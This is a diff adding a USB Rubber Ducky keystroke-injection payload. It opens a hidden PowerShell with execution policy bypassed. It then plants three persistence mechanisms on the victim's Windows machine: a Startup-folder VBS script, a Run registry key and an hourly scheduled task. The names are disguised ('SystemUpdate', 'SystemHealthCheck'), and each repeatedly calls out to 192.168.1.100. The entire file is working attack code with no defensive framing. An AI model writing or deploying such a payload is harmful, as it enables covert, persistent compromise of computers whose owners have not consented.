@@ -1,0 +1,23 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Create persistence mechanism
+STRING $PersistencePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.vbs"
+ENTER
+DELAY 500
+STRING $VBScript = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \&Start-Job -ScriptBlock { while(`$true) { Start-Sleep -Seconds 300; Invoke-WebRequest -Uri 'http://192.168.1.100/ping' -UseBasicParsing } }`"", 0, False"
+ENTER
+DELAY 500
+STRING $VBScript | Out-File -FilePath $PersistencePath -Force
+ENTER
+DELAY 500
+REM Add registry entry
+STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "wscript.exe `"$PersistencePath`"" -Force
+ENTER
+DELAY 500
+REM Create scheduled task
+STRING schtasks /create /tn "SystemHealthCheck" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Job -ScriptBlock { while(`$true) { Start-Sleep -Seconds 3600; Invoke-WebRequest -Uri 'http://192.168.1.100/heartbeat' -UseBasicParsing } }`"" /sc hourly /f
+ENTER
